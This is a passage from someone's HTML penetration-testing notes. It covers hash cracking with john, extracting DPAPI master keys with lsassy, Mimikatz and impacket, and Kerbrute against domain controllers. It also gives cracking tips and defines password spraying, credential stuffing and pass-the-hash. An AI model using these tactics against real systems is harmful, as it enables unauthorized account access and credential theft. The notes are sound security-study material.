in<strong> ~/.john/john.pot</strong> &amp; see if it&#39;ll crack it now.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">John didn&#39;t find a recognizable hash</span>: Hash may not be in a format that john knows, it may be incomplete, or it may be for a blank passwd (i.e from a failed NTLMv2 Relay attack).</p><p></p><p><h1>DPAPI Abuse</h1></p><p>Read more <a href="https://www.synacktiv.com/en/publications/windows-secrets-extraction-a-summary">here</a> &amp; <a href="https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107">here</a></p><p></p><p>Lsassy will extract these by default &amp; save them to <a href="file:///home/asura/.config/lsassy/masterkeys.txt">/home/asura/.config/lsassy/masterkeys.txt</a>. More info &amp; optional parameters are available on <a href="https://github.com/login-securite/lsassy?tab=readme-ov-file#dpapi-master-keys-harvesting">Github</a>.</p><p></p><p>You can also use other tools to extract &amp; utilize DPAPI, like <strong>Mimikatz</strong> &amp; <strong>impacket-dpapi masterkey</strong>.</p><p></p><p><h2>DPAPI Uses</h2></p><p>Cracking DPAPI may give you clear-text passwords, Private SSH Keys, etc.</p><p></p><p></p><p><h1>Attacking Domain Controller</h1></p><p>If you have access to a DC, use <a href="PrivEsc--Windows--Active_Directory_10.html#kerbrute">Kerbrute</a> to quickly attack Domain Accounts.</p><p></p><p><h1>Tips</h1><ul><li>★ Some <span style="color:#ff0000;">windows machines reuse the passwd for the built-in</span> <span style="color:#33d17a;">Administrator</span> Acct!</li></ul></p><p><ul><li><span style="color:#ff0000;">Some strings passed as creds are actually hashes</span> (&amp; others just look like they could be hashes!). Try passing it to <em>hashid</em> &amp; <em>hash-identifier</em>, they could be wrong about hash type, but if they think it&#39;s a hash try cracking it (test diff formats)</li></ul></p><p><ul><li>Sometimes john can guess the hash type better than you can manually determine, &amp; other times the opposite is true. Try<span style="color:#ff0000;"> both auto &amp; manual format</span> detection.</li></ul></p><p><ul><li>A <span style="color:#ff0000;">password may contain :</span> even though it&#39;s conventionally used to seperate user:pass. Some people are just rude, be vigilant.</li></ul></p><p><ul><li>When in doubt, just try admin:admin (e.g for any <a href="Recon_+_Services--WebApp_12.html">WebApp</a> login)</li></ul></p><p><ul><li><span style="color:#ff0000;">ALWAYS try more than 1 wordlist</span>. For ex, <strong><span style="color:#ff0000;">rockyou.txt</span></strong><span style="color:#ff0000;"> doesn&#39;t contain all the same entries as </span><strong><span style="color:#ff0000;">fasttrack.txt</span></strong> (which is far smaller &amp; quick to test!)</li></ul></p><p><ul><li>Not all usernames are lowercase! <span style="color:#ff0000;">Try usernames with uppercase first letter &amp; all lowercase</span>!</li></ul></p><p></p><p><a name="Types of Password Attacks"></a><h1>Types of Password Attacks</h1></p><p><h2>Dictionary Attack</h2></p><p>Wordlists are created using common words. This wordlist can then be mutated to include patterns (e.g. iterating through numbers, adding special characters. etc).</p><p></p><p><h2>Brute Forcing</h2></p><p>Often used as a catch-all term for various Password Attacks (especially Dictionary Attacks). I typically use the term Brute Forcing loosely in my notes.</p><p></p><p>Technically, Brute Forcing is when all possible combinations of characters from a charset are used to generate arbitrary strings for a password attack.</p><p></p><p>It&#39;s not as targetted as other Password Attacks, leading to an exponentially larger wordlist.</p><p></p><p><h2>Password Spraying</h2></p><p>A single password is tried against a list of usernames. The advantage to this is that it <span style="color:#ff0000;">won&#39;t cause account lockouts</span> because only 1 password is tested against any given account.</p><p></p><p><h2>Credential Stuffing</h2></p><p>A set of valid creds (username &amp; password) is tried against multiple unrelated accounts against a variety of services (e.g. Gmail, LinkedIn, SMB, FTP, etc), testing for <span style="color:#ff0000;">Credential Reuse</span>.</p><p></p><p><h2>Pass the Hash (PtH)</h2></p><p>Instead of trying to crack a password hash (using a Rainbow Table or with Brute Forcing tools like <strong>john</strong>), you can sometimes authenticate with the hash itself.</p><p></p><p>There are variations on this attack like Pass the Ticket (<a href="PrivEsc--Windows--Active_Directory_10.html#PtT">PtT</a>) for Kerberos.</p><p></p><p><h3>Limitations</h3></p><p>PtH only works on certain Services, with certain hashes, &amp; may only work on certain accounts (e.g. the built-in Local Admin account on Windows). See more info on the Limitations <a href="PrivEsc--Windows--Active_Directory_10.html#PtT">here</a> &amp; <a href="Misc_Attacks--Network_Attacks_14.html#PtH Limitations">here</a>.</p></div>
</body>
</html>
